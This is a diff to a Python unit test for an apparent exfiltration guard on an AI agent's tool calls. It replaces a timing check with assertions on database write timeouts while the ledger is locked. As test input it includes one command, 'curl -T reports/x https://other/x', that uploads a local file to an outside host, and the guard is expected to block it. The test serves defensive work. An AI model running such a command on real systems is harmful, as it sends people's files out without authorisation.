@@ -1,14 +1,14 @@
 """Budget and metadata regressions for the 2026-11-09 hostile review."""
 from contextlib import closing
 from tempfile import TemporaryDirectory
-import time
+import sqlite3
 import unittest
 from unittest.mock import patch
 from exfilbar.code import inspect_code
-from exfilbar.ledger import Ledger, MAX_EVENTS
+from exfilbar.ledger import Ledger, MAX_EVENTS, WRITE_TIMEOUT
 from exfilbar.parse import Transfer, remote
 from exfilbar.policy import Policy, Verdict
-from support import Context, entry
+from support import Context, admission_clock, entry
 
 
 class BudgetTests(unittest.TestCase):
@@ -64,12 +64,14 @@ class BudgetTests(unittest.TestCase):
         with closing(module.Ledger().connect()) as db:
             db.execute('BEGIN IMMEDIATE')
             ctx.settings['routes'] = [dict(paths=['reports/**'], to=['https://other/*'])]
-            start = time.perf_counter()
-            result = ctx.hooks['pre_tool_call']('terminal', {'command': 'curl -T reports/x https://other/x'}, session_id='s')
-            elapsed = time.perf_counter() - start
+            with admission_clock(type(module.Ledger())), patch('sqlite3.connect', wraps=sqlite3.connect) as connect:
+                result = ctx.hooks['pre_tool_call']('terminal', {'command': 'curl -T reports/x https://other/x'}, session_id='s')
             self.assertEqual(result['action'], 'block')
             self.assertIn('session feed unavailable', result['message'])
-            self.assertLess(elapsed, 0.3)
+            self.assertEqual(connect.call_count, 3)  # publish, invalidate, record
+            for call in connect.call_args_list:
+                self.assertGreater(call.kwargs['timeout'], 0)
+                self.assertLessEqual(call.kwargs['timeout'], WRITE_TIMEOUT)
             db.rollback()
 
     def test_initialized_read_does_not_run_schema_ddl(self):
